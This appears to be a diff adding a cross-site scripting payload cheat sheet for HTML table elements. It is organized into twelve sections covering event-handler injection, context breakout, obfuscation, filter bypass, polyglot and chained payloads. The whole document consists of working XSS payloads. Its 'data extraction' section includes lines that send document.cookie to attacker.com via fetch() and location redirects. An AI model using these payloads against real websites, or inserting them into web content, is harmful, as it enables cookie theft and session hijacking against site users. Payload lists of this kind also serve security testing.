@@ -1,0 +1,98 @@
+🔥 ULTIMATE TABLE XSS (CLEAN)
+
+⸻
+
+1. CORE (EVENT-BASED — ENG MUHIM)
+
+<table onmouseover=alert(1)>
+<tr onmouseover=alert(1)>
+<td onmouseover=alert(1)>
+
+
+⸻
+
+2. CLICK / INTERACTION
+
+<table onclick=alert(1)>
+<td onclick=alert(1)>
+<tr onclick=alert(1)>
+
+
+⸻
+
+3. CONTEXT BREAKOUT
+
+"><table onmouseover=alert(1)>
+'><td onclick=alert(1)>
+
+
+⸻
+
+4. DATA EXTRACTION
+
+<td onmouseover=alert(document.cookie)>
+<tr onclick=fetch('//attacker.com?c='+document.cookie)>
+<table onclick=location='//attacker.com?c='+document.cookie>
+
+
+⸻
+
+5. ATTRIBUTE INJECTION
+
+<td style="width:100%" onmouseover=alert(1)>
+<tr style="height:100%" onclick=alert(1)>
+
+
+⸻
+
+6. OBFUSCATION
+
+<td onmouseover=\u0061lert(1)>
+<tr onclick=alert(String.fromCharCode(88,83,83))>
+
+
+⸻
+
+7. ATTRIBUTE BYPASS
+
+<td/onmouseover=alert(1)>
+<tr/onclick=alert(1)>
+
+
+⸻
+
+8. POLYGLOT
+
+</title><table onmouseover=alert(1)>
+
+
+⸻
+
+9. MODERN JS
+
+<td onmouseover=alert`1`>
+<tr onclick=(()=>alert(1))()>
+
+
+⸻
+
+10. ADVANCED EXECUTION
+
+<td onclick=eval('alert(1)')>
+<tr onclick=setTimeout(alert,0,1)>
+
+
+⸻
+
+11. HYBRID (CHAIN)
+
+<td><img src=x onerror=alert(1)></td>
+<tr><svg onload=alert(1)></tr>
+
+
+⸻
+
+12. RARE BUT USEFUL
+
+<td onclick=throw alert(1)>
+<tr onclick=onerror=alert;throw 1>
